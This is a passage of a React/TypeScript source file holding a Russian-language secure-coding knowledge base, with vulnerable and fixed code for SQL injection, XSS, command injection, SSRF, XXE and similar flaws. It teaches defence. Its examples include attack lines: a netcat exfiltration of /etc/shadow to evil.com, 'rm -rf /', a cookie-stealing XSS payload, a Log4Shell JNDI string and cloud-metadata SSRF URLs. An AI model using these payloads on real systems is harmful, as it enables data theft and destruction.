import { useState, useMemo } from "react";
import { RequireAuth } from "../context/AuthContext";
import { severityBadge, severityLabel } from "../lib/severity";
import type { Severity } from "../lib/types";

// ── Data ────────────────────────────────────────────────────────────────────

interface Reference {
  label: string;
  url: string;
}

interface VulnEntry {
  id: string;
  cwe: string;
  owasp: string;
  title: string;
  severity: Severity;
  category: string;
  shortDesc: string;
  description: string;
  howItWorks: string;
  vulnCode?: { lang: string; code: string };
  fixCode?: { lang: string; code: string };
  recommendations: string[];
  references: Reference[];
  frequency: number;
  tags: string[];
}

const KB_DATA: VulnEntry[] = [
  {
    id: "sql-injection",
    cwe: "CWE-89",
    owasp: "A03:2021",
    title: "SQL Injection",
    severity: "critical",
    category: "Инъекция",
    shortDesc: "Внедрение SQL-кода через пользовательский ввод для манипуляции базой данных.",
    description:
      "SQL Injection возникает, когда непроверенные пользовательские данные вставляются в SQL-запрос. Атакующий может читать, изменять или удалять данные, обходить аутентификацию и выполнять команды на уровне ОС (через xp_cmdshell).",
    howItWorks:
      "Приложение формирует SQL-запрос конкатенацией строк. Атакующий вставляет ' OR '1'='1 и логика WHERE превращается в всегда-истинное условие.",
    vulnCode: {
      lang: "python",
      code: `# ❌ УЯЗВИМО — строковая конкатенация
user_id = request.args.get('id')
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)
# Атака: id=1 OR 1=1; DROP TABLE users; --`,
    },
    fixCode: {
      lang: "python",
      code: `# ✅ БЕЗОПАСНО — параметризованный запрос
user_id = request.args.get('id')
cursor.execute(
    "SELECT * FROM users WHERE id = %s",
    (user_id,)  # Данные передаются отдельно от SQL
)`,
    },
    recommendations: [
      "Всегда использовать параметризованные запросы или ORM",
      "Применять принцип минимальных привилегий для DB-пользователя",
      "Валидировать и санировать все входные данные",
      "Включить WAF с правилами SQL Injection",
      "Не отображать детали ошибок БД пользователю",
    ],
    references: [
      { label: "MITRE CWE-89", url: "https://cwe.mitre.org/data/definitions/89.html" },
      { label: "OWASP SQL Injection", url: "https://owasp.org/www-community/attacks/SQL_Injection" },
      { label: "PortSwigger SQL Injection", url: "https://portswigger.net/web-security/sql-injection" },
    ],
    frequency: 23,
    tags: ["database", "injection", "owasp-top10"],
  },
  {
    id: "xss",
    cwe: "CWE-79",
    owasp: "A03:2021",
    title: "Cross-Site Scripting (XSS)",
    severity: "high",
    category: "Инъекция",
    shortDesc: "Внедрение вредоносного JavaScript в страницы, которые видят другие пользователи.",
    description:
      "XSS позволяет атакующему выполнить произвольный JavaScript в браузере жертвы. Это ведёт к краже cookies/токенов, перехвату форм, редиректу на фишинг-сайты и полному захвату аккаунта.",
    howItWorks:
      "Приложение отражает пользовательский ввод в HTML без экранирования. Атакующий вставляет <script>fetch('evil.com?c='+document.cookie)</script>.",
    vulnCode: {
      lang: "javascript",
      code: `// ❌ УЯЗВИМО — прямая вставка HTML
const username = req.query.username;
res.send(\`<h1>Привет, \${username}!</h1>\`);

// Клиентский React (тоже уязвимо):
element.innerHTML = userInput;`,
    },
    fixCode: {
      lang: "javascript",
      code: `// ✅ БЕЗОПАСНО — экранирование + CSP
import { escape } from 'html-escaper';
res.send(\`<h1>Привет, \${escape(username)}!</h1>\`);

// React — использовать textContent или DOMPurify:
element.textContent = userInput;
// или:
element.innerHTML = DOMPurify.sanitize(userInput);`,
    },
    recommendations: [
      "Экранировать все данные перед вставкой в HTML-контекст",
      "Настроить строгий Content-Security-Policy (CSP) заголовок",
      "Использовать HttpOnly и Secure флаги для cookies",
      "Применять DOMPurify для обработки HTML-контента",
      "Включить X-XSS-Protection заголовок для старых браузеров",
    ],
    references: [
      { label: "MITRE CWE-79", url: "https://cwe.mitre.org/data/definitions/79.html" },
      { label: "OWASP XSS", url: "https://owasp.org/www-community/attacks/xss/" },
      { label: "PortSwigger XSS", url: "https://portswigger.net/web-security/cross-site-scripting" },
    ],
    frequency: 18,
    tags: ["javascript", "html", "browser", "owasp-top10"],
  },
  {
    id: "hardcoded-creds",
    cwe: "CWE-798",
    owasp: "A07:2021",
    title: "Hardcoded Credentials",
    severity: "critical",
    category: "Аутентификация",
    shortDesc: "Пароли, токены и API-ключи захардкожены прямо в исходном коде.",
    description:
      "Жёстко заданные учётные данные обнаруживаются любым, кто получает доступ к коду — через GitHub, npm-пакет или декомпиляцию. Один утёкший секрет даёт полный доступ к сервисам.",
    howItWorks:
      "Разработчик для удобства вставляет ключ прямо в код. Код попадает в Git-историю — и даже после удаления остаётся в истории коммитов. Автоматические боты сканируют GitHub каждые минуты.",
    vulnCode: {
      lang: "python",
      code: `# ❌ УЯЗВИМО — секреты в коде
API_KEY = "sk-abc123xyz789supersecret"
DB_PASSWORD = "P@ssw0rd_prod_2024!"
AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

stripe.api_key = "sk_live_<КЛЮЧ_ЗАХАРДКОЖЕН_ЗДЕСЬ>"`,
    },
    fixCode: {
      lang: "python",
      code: `# ✅ БЕЗОПАСНО — переменные окружения
import os
from dotenv import load_dotenv

load_dotenv()  # .env файл в .gitignore!

API_KEY = os.environ["OPENAI_API_KEY"]    # KeyError если не задан
DB_PASSWORD = os.getenv("DB_PASSWORD")    # None если не задан
stripe.api_key = os.environ["STRIPE_SECRET_KEY"]`,
    },
    recommendations: [
      "Хранить все секреты в переменных окружения или Vault",
      "Добавить .env в .gitignore немедленно, до первого коммита",
      "Использовать pre-commit hook с detect-secrets или gitleaks",
      "Ротировать скомпрометированные ключи немедленно",
      "Использовать менеджеры секретов: AWS Secrets Manager, HashiCorp Vault",
    ],
    references: [
      { label: "MITRE CWE-798", url: "https://cwe.mitre.org/data/definitions/798.html" },
      { label: "OWASP Secrets Management", url: "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html" },
      { label: "Gitleaks", url: "https://github.com/gitleaks/gitleaks" },
    ],
    frequency: 31,
    tags: ["secrets", "api-keys", "environment", "owasp-top10"],
  },
  {
    id: "path-traversal",
    cwe: "CWE-22",
    owasp: "A01:2021",
    title: "Path Traversal",
    severity: "high",
    category: "Контроль доступа",
    shortDesc: "Чтение произвольных файлов за пределами разрешённой директории через ../../",
    description:
      "Path Traversal позволяет читать файлы вне веб-корня: /etc/passwd, приватные ключи, конфиги с паролями. В некоторых случаях возможна запись файлов (Remote Code Execution).",
    howItWorks:
      "Приложение использует имя файла из запроса без проверки. Атакующий передаёт ../../etc/passwd и получает содержимое системного файла.",
    vulnCode: {
      lang: "python",
      code: `# ❌ УЯЗВИМО
filename = request.args.get('file')
with open(f'/var/app/uploads/{filename}', 'r') as f:
    return f.read()
# Атака: file=../../etc/passwd
# Атака: file=../../etc/shadow`,
    },
    fixCode: {
      lang: "python",
      code: `# ✅ БЕЗОПАСНО — проверка реального пути
import os

UPLOAD_DIR = '/var/app/uploads'
filename = request.args.get('file', '')

# Убрать path separators и проверить реальный путь
safe_path = os.path.realpath(os.path.join(UPLOAD_DIR, filename))
if not safe_path.startswith(UPLOAD_DIR + os.sep):
    abort(403)  # Попытка выхода за пределы директории

with open(safe_path, 'r') as f:
    return f.read()`,
    },
    recommendations: [
      "Использовать os.path.realpath() и проверять prefix безопасной директории",
      "Не использовать пользовательский ввод напрямую в путях к файлам",
      "Хранить файлы вне веб-корня или в облачном хранилище (S3)",
      "Применять белый список разрешённых имён файлов",
      "Запустить приложение от непривилегированного пользователя",
    ],
    references: [
      { label: "MITRE CWE-22", url: "https://cwe.mitre.org/data/definitions/22.html" },
      { label: "OWASP Path Traversal", url: "https://owasp.org/www-community/attacks/Path_Traversal" },
    ],
    frequency: 9,
    tags: ["filesystem", "access-control", "owasp-top10"],
  },
  {
    id: "command-injection",
    cwe: "CWE-78",
    owasp: "A03:2021",
    title: "Command Injection",
    severity: "critical",
    category: "Инъекция",
    shortDesc: "Выполнение произвольных системных команд через пользовательский ввод.",
    description:
      "Command Injection — одна из наиболее опасных уязвимостей: атакующий получает полный контроль над сервером. Часто ведёт к установке backdoor, утечке всех данных и lateral movement в сети.",
    howItWorks:
      "Приложение строит системную команду, включая пользовательские данные. Символы ;, |, && позволяют выполнить дополнительные команды.",
    vulnCode: {
      lang: "python",
      code: `# ❌ УЯЗВИМО — shell=True + конкатенация
import subprocess, os

filename = request.args.get('filename')
os.system(f"convert {filename} output.png")
# Атака: filename=x; rm -rf /
# Атака: filename=x; cat /etc/shadow | nc evil.com 4444`,
    },
    fixCode: {
      lang: "python",
      code: `# ✅ БЕЗОПАСНО — список аргументов, без shell
import subprocess, shlex

filename = request.args.get('filename', '')
# Проверить имя файла белым списком
if not re.match(r'^[a-zA-Z0-9_.-]+$', filename):
    abort(400)

# Передавать как список, а не строку — shell=False по умолчанию
result = subprocess.run(
    ['convert', filename, 'output.png'],
    capture_output=True, timeout=30, check=True
)`,
    },
    recommendations: [
      "Никогда не передавать пользовательские данные в shell=True",
      "Использовать список аргументов вместо строк в subprocess",
      "Применять белый список допустимых значений",
      "Запустить sandbox (seccomp, AppArmor) для ограничения системных вызовов",
      "Рассмотреть замену shell-команд на библиотечные функции",
    ],
    references: [
      { label: "MITRE CWE-78", url: "https://cwe.mitre.org/data/definitions/78.html" },
      { label: "OWASP Command Injection", url: "https://owasp.org/www-community/attacks/Command_Injection" },
    ],
    frequency: 7,
    tags: ["shell", "os", "rce", "owasp-top10"],
  },
  {
    id: "ssrf",
    cwe: "CWE-918",
    owasp: "A10:2021",
    title: "Server-Side Request Forgery (SSRF)",
    severity: "high",
    category: "Сетевые атаки",
    shortDesc: "Сервер выполняет HTTP-запросы к произвольным адресам, включая внутреннюю сеть.",
    description:
      "SSRF позволяет атакующему заставить сервер обращаться к внутренним сервисам (169.254.169.254 для cloud metadata, Redis, Elasticsearch). Особо опасно в облаке: можно получить IAM-токены AWS.",
    howItWorks:
      "Функция загрузки URL-адресов принимает URL от пользователя. Атакующий передаёт http://169.254.169.254/latest/meta-data/iam/security-credentials/.",
    vulnCode: {
      lang: "python",
      code: `# ❌ УЯЗВИМО — запрос к произвольному URL
url = request.args.get('url')
response = requests.get(url, timeout=10)
return response.content

# Атака: url=http://169.254.169.254/latest/meta-data/
# Атака: url=http://internal-redis:6379`,
    },
    fixCode: {
      lang: "python",
      code: `# ✅ БЕЗОПАСНО — валидация + белый список доменов
from urllib.parse import urlparse
import ipaddress

ALLOWED_DOMAINS = {'api.example.com', 'cdn.example.com'}

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        return False
    hostname = parsed.hostname
    if hostname in ALLOWED_DOMAINS:
        return True
    # Блокировать приватные IP
    try:
        ip = ipaddress.ip_address(hostname)
        return not ip.is_private
    except ValueError:
        return False

url = request.args.get('url', '')
if not is_safe_url(url):
    abort(403)
response = requests.get(url, timeout=5)`,
    },
    recommendations: [
      "Применять белый список разрешённых доменов/IP",
      "Блокировать запросы к приватным адресам (RFC 1918) и link-local",
      "Отключить неиспользуемые URL-схемы (file://, gopher://)",
      "Настроить egress-фаервол на уровне сети",
      "В облаке: отключить Instance Metadata Service v1 (IMDSv2 only)",
    ],
    references: [
      { label: "MITRE CWE-918", url: "https://cwe.mitre.org/data/definitions/918.html" },
      { label: "PortSwigger SSRF", url: "https://portswigger.net/web-security/ssrf" },
      { label: "OWASP SSRF", url: "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/" },
    ],
    frequency: 5,
    tags: ["network", "cloud", "aws", "internal"],
  },
  {
    id: "insecure-deserialization",
    cwe: "CWE-502",
    owasp: "A08:2021",
    title: "Insecure Deserialization",
    severity: "high",
    category: "Инъекция",
    shortDesc: "Десериализация недоверенных данных приводит к выполнению произвольного кода.",
    description:
      "Pickle, PyYAML с load() и другие форматы позволяют встраивать исполняемые объекты. При десериализации вредоносных данных атакующий получает RCE без какой-либо дополнительной аутентификации.",
    howItWorks:
      "Python pickle выполняет код при десериализации через __reduce__. Аналогично: Java ObjectInputStream, PHP unserialize, Node.js node-serialize.",
    vulnCode: {
      lang: "python",
      code: `# ❌ УЯЗВИМО — десериализация данных от пользователя
import pickle, base64

data = request.args.get('session')
obj = pickle.loads(base64.b64decode(data))  # RCE!

# Также уязвимо:
import yaml
config = yaml.load(user_input)  # yaml.load без Loader`,
    },
    fixCode: {
      lang: "python",
      code: `# ✅ БЕЗОПАСНО — безопасные альтернативы
import json, yaml

# Вместо pickle — JSON
obj = json.loads(user_input)  # Только данные, без кода

# Для YAML — safe_load
config = yaml.safe_load(user_input)  # Запрещает Python-объекты

# Если pickle необходим — HMAC-подпись
import hmac, hashlib
def safe_loads(data: bytes, secret: bytes):
    payload, sig = data[:-32], data[-32:]
    expected = hmac.new(secret, payload, hashlib.sha256).digest()
    if not hmac.compare_digest(sig, expected):
        raise ValueError("Invalid signature")
    return pickle.loads(payload)`,
    },
    recommendations: [
      "Не использовать pickle/marshal для данных от пользователей",
      "Заменить pickle на JSON или MessagePack",
      "Использовать yaml.safe_load вместо yaml.load",
      "При необходимости pickle — проверять HMAC-подпись перед десериализацией",
      "Запустить десериализацию в изолированном sandbox",
    ],
    references: [
      { label: "MITRE CWE-502", url: "https://cwe.mitre.org/data/definitions/502.html" },
      { label: "OWASP Deserialization", url: "https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data" },
    ],
    frequency: 4,
    tags: ["pickle", "yaml", "rce", "serialization"],
  },
  {
    id: "broken-auth",
    cwe: "CWE-287",
    owasp: "A07:2021",
    title: "Broken Authentication",
    severity: "critical",
    category: "Аутентификация",
    shortDesc: "Слабая аутентификация: предсказуемые токены, отсутствие rate limiting, слабые пароли.",
    description:
      "Сломанная аутентификация включает: отсутствие проверки JWT-подписи, предсказуемые session ID, отсутствие 2FA, несоблюдение таймаутов сессий, хранение паролей в открытом виде.",
    howItWorks:
      "JWT с alg=none принимается многими библиотеками без проверки подписи. Атакующий подменяет payload и получает доступ как любой пользователь.",
    vulnCode: {
      lang: "python",
      code: `# ❌ УЯЗВИМО — JWT без проверки подписи
import jwt

token = request.headers.get('Authorization').split()[1]
# options={"verify_signature": False} - опасно!
payload = jwt.decode(token, options={"verify_signature": False})
user_id = payload['sub']  # Атакующий может вставить любой user_id`,
    },
    fixCode: {
      lang: "python",
      code: `# ✅ БЕЗОПАСНО — проверка подписи обязательна
import jwt
from functools import wraps

SECRET_KEY = os.environ["JWT_SECRET"]  # 256-bit random key

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization', '').split()[-1]
        try:
            payload = jwt.decode(
                token,
                SECRET_KEY,
                algorithms=["HS256"],  # Явно указать алгоритм
                options={"require": ["exp", "iat", "sub"]}
            )
        except jwt.InvalidTokenError as e:
            abort(401, str(e))
        return f(payload, *args, **kwargs)
    return decorated`,
    },
    recommendations: [
      "Всегда явно указывать алгоритм при decode, никогда не использовать alg=none",
      "Использовать криптографически случайные session ID (secrets.token_urlsafe)",
      "Хранить пароли через bcrypt/argon2 с солью",
      "Внедрить rate limiting на эндпоинт /login (5 попыток / 15 минут)",
      "Включить 2FA для всех привилегированных аккаунтов",
    ],
    references: [
      { label: "MITRE CWE-287", url: "https://cwe.mitre.org/data/definitions/287.html" },
      { label: "OWASP Authentication Cheatsheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html" },
      { label: "JWT Security Best Practices", url: "https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/" },
    ],
    frequency: 8,
    tags: ["jwt", "session", "password", "owasp-top10"],
  },
  {
    id: "sensitive-data",
    cwe: "CWE-200",
    owasp: "A02:2021",
    title: "Sensitive Data Exposure",
    severity: "medium",
    category: "Криптография",
    shortDesc: "Персональные данные, пароли или финансовые данные передаются или хранятся без шифрования.",
    description:
      "Незашифрованные PII, PCI DSS и PHI данные — источник огромных штрафов (GDPR €20M) и репутационного ущерба. Данные могут утекать через HTTP, логи, debug-вывод или незашифрованную БД.",
    howItWorks:
      "HTTP (не HTTPS) перехватывается на уровне сети (man-in-the-middle). Данные в логах могут быть прочитаны через LFI или утечку логов.",
    vulnCode: {
      lang: "python",
      code: `# ❌ УЯЗВИМО — пароль в логах
import logging
logger = logging.getLogger(__name__)

def login(username, password):
    logger.debug(f"Login attempt: {username} / {password}")  # Пароль в логах!
    # ...

# Также уязвимо — MD5 для паролей:
password_hash = hashlib.md5(password.encode()).hexdigest()`,
    },
    fixCode: {
      lang: "python",
      code: `# ✅ БЕЗОПАСНО
import logging
import bcrypt

logger = logging.getLogger(__name__)

def login(username: str, password: str):
    logger.info(f"Login attempt: {username}")  # Только username!
    # Никогда не логировать пароль

    # Хэш пароля через bcrypt
    stored_hash = get_password_hash(username)
    if bcrypt.checkpw(password.encode(), stored_hash):
        return create_session(username)
    return None`,
    },
    recommendations: [
      "Принудительно использовать HTTPS (HSTS заголовок)",
      "Никогда не логировать пароли, токены, номера карт",
      "Использовать bcrypt/argon2 для хранения паролей (не MD5/SHA1)",
      "Шифровать чувствительные поля в БД (AES-256-GCM)",
      "Настроить TLS 1.2+ и отключить устаревшие шифры",
    ],
    references: [
      { label: "MITRE CWE-200", url: "https://cwe.mitre.org/data/definitions/200.html" },
      { label: "OWASP A02:2021", url: "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" },
    ],
    frequency: 14,
    tags: ["pii", "encryption", "logging", "https"],
  },
  {
    id: "xxe",
    cwe: "CWE-611",
    owasp: "A05:2021",
    title: "XML External Entity (XXE)",
    severity: "high",
    category: "Инъекция",
    shortDesc: "Обработка XML с внешними сущностями позволяет читать файлы и проводить SSRF.",
    description:
      "XXE позволяет читать произвольные файлы через entity &xxe; и проводить SSRF через внешние entity-ссылки. Уязвим любой XML-парсер с включёнными external entities по умолчанию.",
    howItWorks:
      "Атакующий отправляет XML с DOCTYPE, который определяет сущность, ссылающуюся на file:///etc/passwd. Парсер раскрывает её и данные попадают в ответ.",
    vulnCode: {
      lang: "python",
      code: `# ❌ УЯЗВИМО — lxml с resolve_entities
from lxml import etree

xml_data = request.get_data()
root = etree.fromstring(xml_data)  # XXE по умолчанию в lxml < 4.x
# Payload: <!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
# <root>&xxe;</root>`,
    },
    fixCode: {
      lang: "python",
      code: `# ✅ БЕЗОПАСНО — отключить external entities
from lxml import etree

def safe_parse(xml_bytes: bytes):
    parser = etree.XMLParser(
        resolve_entities=False,   # Запретить внешние entity
        no_network=True,          # Запретить сетевые запросы
        load_dtd=False,           # Не загружать DTD
    )
    return etree.fromstring(xml_bytes, parser=parser)

# Альтернатива: использовать defusedxml
import defusedxml.ElementTree as ET
root = ET.fromstring(xml_data)  # Безопасно по умолчанию`,
    },
    recommendations: [
      "Использовать defusedxml вместо стандартного xml.etree",
      "Явно отключать external entity в парсере: resolve_entities=False",
      "Рассмотреть замену XML на JSON для API",
      "Применять WAF с XXE-сигнатурами",
    ],
    references: [
      { label: "MITRE CWE-611", url: "https://cwe.mitre.org/data/definitions/611.html" },
      { label: "OWASP XXE", url: "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing" },
      { label: "defusedxml", url: "https://github.com/tiran/defusedxml" },
    ],
    frequency: 3,
    tags: ["xml", "parser", "file-read"],
  },
  {
    id: "open-redirect",
    cwe: "CWE-601",
    owasp: "A01:2021",
    title: "Open Redirect",
    severity: "medium",
    category: "Контроль доступа",
    shortDesc: "Редирект на произвольный URL через параметр запроса, используется для фишинга.",
    description:
      "Open Redirect используется в фишинге: пользователь видит надёжный домен в начале URL, но перенаправляется на вредоносный сайт. Особо опасно в OAuth-флоу.",
    howItWorks:
      "https://trusted.com/login?next=https://evil.com — пользователь доверяет началу URL. Клик — и он на фишинге.",
    vulnCode: {
      lang: "python",
      code: `# ❌ УЯЗВИМО
next_url = request.args.get('next', '/')
return redirect(next_url)
# Атака: ?next=https://evil.com/steal-creds`,
    },
    fixCode: {
      lang: "python",
      code: `# ✅ БЕЗОПАСНО — только относительные URL или белый список
from urllib.parse import urlparse

def safe_redirect(next_url: str) -> str:
    ALLOWED_HOSTS = {'app.example.com', 'www.example.com'}
    parsed = urlparse(next_url)
    # Разрешить только относительные URL (без хоста)
    if not parsed.netloc:
        return next_url
    if parsed.netloc in ALLOWED_HOSTS:
        return next_url
    return '/'  # Fallback на главную

return redirect(safe_redirect(request.args.get('next', '/')))`,
    },
    recommendations: [
      "Разрешать только относительные URL или проверять whitelist хостов",
      "Предупреждать пользователей о внешних редиректах",
      "Не использовать URL из параметров напрямую",
    ],
    references: [
      { label: "MITRE CWE-601", url: "https://cwe.mitre.org/data/definitions/601.html" },
      { label: "OWASP Unvalidated Redirects", url: "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect" },
    ],
    frequency: 6,
    tags: ["redirect", "phishing", "oauth"],
  },
  {
    id: "weak-crypto",
    cwe: "CWE-327",
    owasp: "A02:2021",
    title: "Weak Cryptography",
    severity: "medium",
    category: "Криптография",
    shortDesc: "Использование устаревших алгоритмов: MD5, SHA1, DES, RC4 для критических функций.",
    description:
      "MD5 и SHA1 взломаны для collision attacks. DES ключ (56 бит) перебирается за секунды. RC4 имеет известные bias-атаки. Использование для паролей, подписей и шифрования — критическая ошибка.",
    howItWorks:
      "MD5 collision: два разных файла имеют одинаковый hash. Атакующий создаёт вредоносный файл с hash=hash(оригинала) и обходит проверку целостности.",
    vulnCode: {
      lang: "python",
      code: `# ❌ УЯЗВИМО — устаревшие алгоритмы
import hashlib, Crypto

# MD5 для паролей — взломан
password_hash = hashlib.md5(password.encode()).hexdigest()

# SHA1 для HMAC — взломан (SHAttered)
signature = hmac.new(key, data, hashlib.sha1).hexdigest()

# DES шифрование — ключ 56 бит, перебирается за <1 сек
cipher = DES.new(key, DES.MODE_ECB)`,
    },
    fixCode: {
      lang: "python",
      code: `# ✅ БЕЗОПАСНО — современные алгоритмы
import hashlib, hmac
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import bcrypt, os

# Пароли — bcrypt/argon2
password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# HMAC — SHA-256 минимум
signature = hmac.new(key, data, hashlib.sha256).hexdigest()

# Шифрование — AES-256-GCM (аутентифицированное)
key = AESGCM.generate_key(256)
cipher = AESGCM(key)
nonce = os.urandom(12)
ciphertext = cipher.encrypt(nonce, data, None)`,
    },
    recommendations: [
      "Заменить MD5/SHA1 на SHA-256 или SHA-3 для checksums",
      "Использовать bcrypt или argon2 для паролей (не SHA)",
      "Заменить DES/3DES и RC4 на AES-256-GCM",
      "Использовать TLS 1.3 для транспортного шифрования",
      "Регулярно проверять cryptographic agility — лёгкость смены алгоритмов",
    ],
    references: [
      { label: "MITRE CWE-327", url: "https://cwe.mitre.org/data/definitions/327.html" },
      { label: "NIST Approved Algorithms", url: "https://csrc.nist.gov/projects/cryptographic-algorithm-validation-program" },
    ],
    frequency: 11,
    tags: ["md5", "sha1", "des", "aes", "encryption"],
  },
  {
    id: "prototype-pollution",
    cwe: "CWE-1321",
    owasp: "A03:2021",
    title: "Prototype Pollution",
    severity: "high",
    category: "Инъекция",
    shortDesc: "Модификация прототипа Object в JavaScript, что влияет на все объекты приложения.",
    description:
      "Prototype Pollution позволяет атакующему добавить или изменить свойства Object.prototype. Это влияет на все объекты в приложении: может привести к обходу авторизации, XSS или RCE (в Node.js через child_process).",
    howItWorks:
      "Функция merge/deepClone обрабатывает ключ __proto__. Payload: {\"__proto__\": {\"isAdmin\": true}} — теперь любой объект имеет .isAdmin === true.",
    vulnCode: {
      lang: "javascript",
      code: `// ❌ УЯЗВИМО — небезопасный merge
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];  // __proto__ обрабатывается здесь!
    }
  }
}
// Payload: {"__proto__": {"isAdmin": true}}
merge({}, JSON.parse(userInput));
console.log({}.isAdmin);  // true — у всех объектов!`,
    },
    fixCode: {
      lang: "javascript",
      code: `// ✅ БЕЗОПАСНО — несколько подходов
// 1. Object.create(null) — объект без прототипа
const safe = Object.create(null);

// 2. Проверка опасных ключей
function safeMerge(target, source) {
  const FORBIDDEN = new Set(['__proto__', 'constructor', 'prototype']);
  for (const [key, val] of Object.entries(source)) {
    if (FORBIDDEN.has(key)) continue;  // Пропустить
    target[key] = typeof val === 'object'
      ? safeMerge({}, val)
      : val;
  }
  return target;
}

// 3. Использовать lodash.mergeWith с проверкой
// 4. JSON parse через structuredClone (Node 17+)
const safe2 = structuredClone(untrustedData);`,
    },
    recommendations: [
      "Проверять ключи __proto__, constructor, prototype при merge/assign",
      "Использовать Object.create(null) для словарей/карт",
      "Обновить зависимости: lodash <4.17.21 уязвим",
      "Использовать Map вместо Object для хранения пользовательских данных",
      "Включить --frozen-intrinsics в Node.js (экспериментально)",
    ],
    references: [
      { label: "MITRE CWE-1321", url: "https://cwe.mitre.org/data/definitions/1321.html" },
      { label: "Prototype Pollution Research", url: "https://portswigger.net/research/server-side-prototype-pollution" },
    ],
    frequency: 5,
    tags: ["javascript", "nodejs", "prototype", "object"],
  },
  {
    id: "vulnerable-dependency",
    cwe: "CWE-1395",
    owasp: "A06:2021",
    title: "Vulnerable Dependencies",
    severity: "high",
    category: "Зависимости",
    shortDesc: "Использование npm/pip пакетов с известными CVE уязвимостями.",
    description:
      "До 80% кода современного приложения — сторонние библиотеки. Уязвимые зависимости — самая распространённая причина взломов (Log4Shell, event-stream). CVE обновляются ежедневно.",
    howItWorks:
      "Log4j 2.x (2021): одна строка ${jndi:ldap://evil.com/x} в любом логируемом поле = RCE без аутентификации. Атаковались миллионы серверов по всему миру за 24 часа.",
    vulnCode: {
      lang: "text",
      code: `# ❌ УЯЗВИМЫЕ ВЕРСИИ (примеры)
# requirements.txt
django==2.2.0         # CVE-2022-28346 SQL Injection
pillow==8.2.0         # CVE-2021-25289 Buffer Overflow
requests==2.18.0      # CVE-2018-18074 Redirect leak

# package.json
"lodash": "4.17.15"   # CVE-2021-23337 Command Injection
"axios": "0.18.0"     # CVE-2019-10742 SSRF
"log4j": "2.14.1"     # CVE-2021-44228 Log4Shell RCE!`,
    },
    fixCode: {
      lang: "bash",
      code: `# ✅ ПРОВЕРКА И ОБНОВЛЕНИЕ ЗАВИСИМОСТЕЙ

# Python — проверка через safety / pip-audit
pip install pip-audit
pip-audit -r requirements.txt

# Обновить до безопасных версий:
pip install --upgrade django pillow requests

# Node.js — npm audit
npm audit
npm audit fix  # автоматическое исправление

# Добавить в CI/CD pipeline:
# - pip-audit || exit 1
# - npm audit --audit-level=high || exit 1

# Использовать Dependabot для автообновлений`,
    },
    recommendations: [
      "Включить Dependabot или Renovate для автоматических PR с обновлениями",
      "Добавить pip-audit / npm audit в CI/CD — падать на high CVE",
      "Использовать lockfile (poetry.lock, package-lock.json) для воспроизводимых сборок",
      "Подписываться на GitHub Security Advisories по используемым пакетам",
      "Проверять новые зависимости через OSV.dev до добавления",
    ],
    references: [
      { label: "OSV Database", url: "https://osv.dev" },
      { label: "GitHub Advisory Database", url: "https://github.com/advisories" },
      { label: "MITRE CWE-1395", url: "https://cwe.mitre.org/data/definitions/1395.html" },
    ],
    frequency: 42,
    tags: ["dependencies", "cve", "npm", "pip", "supply-chain"],
  },
  {
    id: "race-condition",
    cwe: "CWE-362",
    owasp: "A04:2021",
    title: "Race Condition (TOCTOU)",
    severity: "medium",
    category: "Параллелизм",
    shortDesc: "Состояние гонки между проверкой и использованием ресурса — атакующий изменяет состояние в промежутке.",
    description:
      "Time-of-Check Time-of-Use: проверка условия и действие разделены во времени. В многопоточных/асинхронных системах атакующий успевает изменить состояние между ними. Типичные последствия: двойное списание, privilege escalation.",
    howItWorks:
      "1. Проверить баланс: 1000₽. 2. Два параллельных запроса на снятие 1000₽. 3. Оба прошли проверку (оба видят 1000₽). 4. Оба снимают — итого -1000₽ на счёте.",
    vulnCode: {
      lang: "python",
      code: `# ❌ УЯЗВИМО — TOCTOU в банковской операции
async def withdraw(user_id: int, amount: float):
    balance = await db.get_balance(user_id)  # Проверка
    if balance < amount:
        raise InsufficientFunds()
    # ← Здесь другой запрос может снять деньги!
    await db.set_balance(user_id, balance - amount)  # Использование`,
    },
    fixCode: {
      lang: "python",
      code: `# ✅ БЕЗОПАСНО — атомарная операция или блокировка
async def withdraw(user_id: int, amount: float):
    async with db.transaction():
        # SELECT FOR UPDATE — блокирует строку
        balance = await db.execute(
            "SELECT balance FROM accounts WHERE id=$1 FOR UPDATE",
            user_id
        )
        if balance < amount:
            raise InsufficientFunds()
        await db.execute(
            "UPDATE accounts SET balance = balance - $1 WHERE id = $2",
            amount, user_id
        )
    # Транзакция завершена — блокировка снята`,
    },
    recommendations: [
      "Использовать database transactions с SELECT FOR UPDATE",
      "Применять атомарные операции: compare-and-swap, atomic counters",
      "Использовать distributed locks (Redis SETNX) для распределённых систем",
      "Применять оптимистичную конкурентность (version column) как альтернативу",
      "Тестировать параллельные сценарии: locust, concurrent.futures",
    ],
    references: [
      { label: "MITRE CWE-362", url: "https://cwe.mitre.org/data/definitions/362.html" },
      { label: "OWASP A04:2021", url: "https://owasp.org/Top10/A04_2021-Insecure_Design/" },
    ],
    frequency: 4,
    tags: ["async", "database", "transactions", "concurrency"],
  },
];

// ── Severity / Category helpers ──────────────────────────────────────────────

const CATEGORIES = ["Все", ...Array.from(new Set(KB_DATA.map((v) => v.category)))];
const SEVERITIES = ["Все", "critical", "high", "medium", "low"] as const;

// ── Code block ───────────────────────────────────────────────────────────────

function CodeBlock({ code, label, variant = "neutral" }: { code: string; label: string; variant?: "danger" | "safe" | "neutral" }) {
  const bgCls =
